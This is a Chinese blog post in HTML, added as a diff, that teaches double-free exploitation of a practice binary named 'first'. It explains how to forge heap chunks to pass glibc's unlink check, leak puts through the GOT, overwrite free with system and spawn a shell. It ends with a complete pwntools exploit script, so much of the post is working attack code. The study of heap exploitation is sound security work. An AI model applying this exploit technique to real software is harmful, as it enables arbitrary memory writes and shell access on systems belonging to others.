@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="koocola&#39;s blog" />
+  
+
+  
+  
+  
+  
+  
+  
+  <title>double free学习 | koocola&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="first:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="double free学习">
+<meta property="og:url" content="http://yoursite.com/2018/08/04/doublefree/index.html">
+<meta property="og:site_name" content="koocola&#39;s blog">
+<meta property="og:description" content="first:">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2018/08/04/doublefree/images/捕获_1.PNG">
+<meta property="og:updated_time" content="2018-08-06T01:56:34.870Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="double free学习">
+<meta name="twitter:description" content="first:">
+<meta name="twitter:image" content="http://yoursite.com/2018/08/04/doublefree/images/捕获_1.PNG">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+</head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="koocola&#39;s blog" rel="home">koocola&#39;s blog</a>
+      </h1>
+      
+        <h2 class="site-description">
+          <a href="/" id="subtitle">不要用战术上的勤奋掩饰战略上的懒惰</a>
+        </h2>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-doublefree" class="post-doublefree post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      double free学习
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2018/08/04/doublefree/" data-id="cjkhn6vho0000lsti2z093wbo" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>first:<br><a id="more"></a><br>先将基本操作用python中的方法表示:<br>def addnote(num,size,content=””):<br>    f.sendline(“1”)<br>    print(f.recv())<br>    f.sendline(str(size))<br>    print(f.recv())<br>    f.sendline(str(num))<br>    print(f.recv())<br>    f.sendline(content)<br>    print(f.recv())    </p>
+<p>def deletenote(num):<br>    f.sendline(“2”)<br>    print(f.recv())<br>    f.sendline(str(num))<br>    print(f.recv())</p>
+<p>def editnote(num,sentence):<br>    f.sendline(“3”)<br>    print(f.recv())<br>    f.sendline(str(num))<br>    print(f.recv())<br>    f.sendline(sentence)<br>    print(f.recv())<br>用IDA打开在delete函数里(如下图）可以发现在free时没有检查堆快是否存在，而且free后没有将指针置为NULL,并且指针存放在（0x6020E0+0x10<em>index)中，这样就有了double free的可能.<br><img src="./images/捕获_1.PNG" alt="enter description here"><br>double free利用的关键:<br>    第二次free某块堆快时如果检测到前一块堆快是空闲状态，这个时候就会发生堆快的合并其中会通过Unlink宏把前一块堆快从链表中取下，进行unlink操作：<br>    {<br>            bk=bk-&gt;fd;<br>            fd-&gt;bk=bk;<br>    }<br>    如果前一块堆快的fFD,BK是伪造的，那么这个操作就是两次的任意地址写。但是触发unlink时有一段这样的检验:<br>    if (builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))<br>      malloc_printerr (check_action, “corrupted double-linked list”, P, AV);<br>    如果在某个地址 i 处存在一个指向前一块堆快块首的指针p，我们令FD=i-0x8</em>3,BK=i-0x8<em>2,这样FD-&gt;bk==BK-&gt;fd==</em>i==p.就可以过掉这一段的检验。<br>    这样构造，进行unlink操作后，地址i处存放的值就会变成 i-0x8<em>3，这时候对i处进行edit操作就可以为所欲为<br>1：我们可以先malloc两块大于0x80堆块，再释放掉（小于0x80分配的是fastbin，fastbin是单链表无法在Unlink时利用)，这里选在第一次malloc0x200(addnote(1,0x200,”aaaaaaa”))，第二次malloc0x300(addnote(2,0x300,”aaaaaaa”))<br>2：这时候释放掉2块堆快，因为是连续分配的地址连续会发生堆快的合并。这样我们第三次分配堆快时堆快的位置就是第一次分配的堆快的位置<br>3：分配第三块堆快，大小只要大于第一次分配的堆快大小+0x10即可(因为实现double free需要伪造第二块堆快的堆头）,这里为了方便，选择(addnote(1,0x500，payload))，但分配的堆快下标一定要是1<br>4: 构造payload：<br>    这里构造的payload如下:<br>                                                payload=p64(0x0)+p64(0x200+1)+p64(pt_address-0x8</em>3)+p64(pt_address-0x8<em>2)+’a’</em>(0x200-32)   堆快一<br>                                                            +p64(0x200)+p64(0x100)+’a’<em>(0x100-16)               堆快二<br>                                                            +p64(0)+p64(0x101)+’a’</em>(0x100-16)                   堆快三<br>                                                            +p64(0x0)+p64(0x111)                                     堆快四                #有更简单的版本，但是这样构造有助于理解<br>                                                    pt_adddress=0x6020E0+0x10<br>    1、<br>    因为在(0x6020E0+0x10<em>2)处存在着指向堆块二块身的指针我们delete(2)进行第二次free堆快二。<br>    这时会先检查是否能向后合并即检查堆快三是否是空闲的，通过检查堆块四的flag标志位来判断，由于我们伪造的堆快四的flag标志位是1所以判定堆块三是活动的无法向后合并。<br>    然后会检查是否能向前合并，因为自身的flag标志位为0判定能向前合并，同时由于堆快二块首处prev_size大小为0x200所以会判定我们伪造的堆快一是前一块堆快并想要通过unlink操作<br>    将堆快一从双向链表中脱离出来，由于我们的pt_address指向的是伪造的堆快一的块首(真正的前一块堆块的块身),所以可以过掉前面讲的Unlink时的检验进行赋值操作，最后的结果就是<br>    pt_address中的值被改写为pt_address-0x8</em>3就可以进行我们想要的操作了<br>5、leak system_addr<br>    因为edit()时会检查堆快是否存在，所以想要对pt_address处的指针进行edit操作的话，我们在3中分配的大小为0x500的堆快的下标一定要是1<br>    我们通过改写0x6020E0处的值为elf.got[‘free’]再edit 0x6020E0处的指针为elf.symbols[‘puts’]  ,改写0x6020E0+0x10出的值为elf.got[‘puts’],这样再delete(1)就可以leak出puts函数的地址再通过计算就可以得到system函数的地址(这里注意的是0x6020E0处分配的堆块零的大小一定要是8，因为read函数会把换行符读取进来，如果大于8换行符会覆盖got表中下一个函数的最低位造成错误)<br>6、getshell<br>    再次edit(0)，把got表中free函数的地址覆盖为我们leak处的system函数的地址<br>    这时分配一个堆快4的内容为/bin/sh<br>    delete(4)就可以getshell 了</p>
+<p>下面是完整的exp：<br>from pwn import *<br>f = process(‘./first’)<br>elf1=ELF(‘./first’)<br>elf2=ELF(‘libc.so.6’)<br>def addnote(num,size,content=””):<br>    f.sendline(“1”)<br>    print(f.recv())<br>    f.sendline(str(size))<br>    print(f.recv())<br>    f.sendline(str(num))<br>    print(f.recv())<br>    f.sendline(content)<br>    print(f.recv())<br>def deletenote(num):<br>    f.sendline(“2”)<br>    print(f.recv())<br>    f.sendline(str(num))<br>    print(f.recv())<br>def editnote(num,sentence):<br>    f.sendline(“3”)<br>    print(f.recv())<br>    f.sendline(str(num))<br>    print(f.recv())<br>    f.sendline(sentence)<br>    print(f.recv())</p>
+<p>f.sendline(“baba”)<br>f.recv()<br>addnote(0,0x8,”xxxxxx”)<br>addnote(1,0x200,”aaaaaaa”)<br>addnote(2,0x300,”aaaaaaa”)<br>addnote(3,0x30,”/bin/sh\0”)<br>deletenote(1)<br>deletenote(2) #exit a pt in 0x100<br>pt_address=0x6020E0+0x10<em>1<br>payload=p64(0x0)+p64(0x200+1)+p64(pt_address-0x8</em>3)+p64(pt_address-0x8<em>2)+’a’</em>(0x200-32)+p64(0x200)+p64(0x100)+’a’<em>(0x100-16)+p64(0)+p64(0x101)+’a’</em>(0x100-16)+p64(0x0)+p64(0x111)<br>addnote(1,0x500,payload)<br>deletenote(2)   #double free; pt_address=pt_address-0x8*3</p>
+<p>#gdb.attach(proc.pidof(f)[0])<br>payload=p64(1)+p64(elf1.got[‘free’])+p64(1)+p64(elf1.got[‘puts’])+p64(1)#got[free]=got[system]<br>editnote(1,payload)<br>editnote(0,p64(elf1.symbols[‘puts’]))</p>
+<p>#deletenote(0)<br>f.sendline(“2”)<br>print(f.recv())<br>f.sendline(str(1))<br>puts_addr=f.recvuntil(‘\n’)<br>puts_addr=puts_addr.replace(“\n”,””)<br>puts_addr=u64(puts_addr+(8-len(puts_addr))*”\x00”)<br>system_addr=elf2.symbols[‘system’]+puts_addr-elf2.symbols[‘puts’]<br>editnote(0,p64(system_addr))<br>f.interactive()</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2018/08/04/doublefree/">
+    <time datetime="2018-08-04T12:43:20.000Z" class="entry-date">
+        2018-08-04
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+    
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2018/08/04/doublefree/">double free学习</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  
+    
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2018 koocola
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
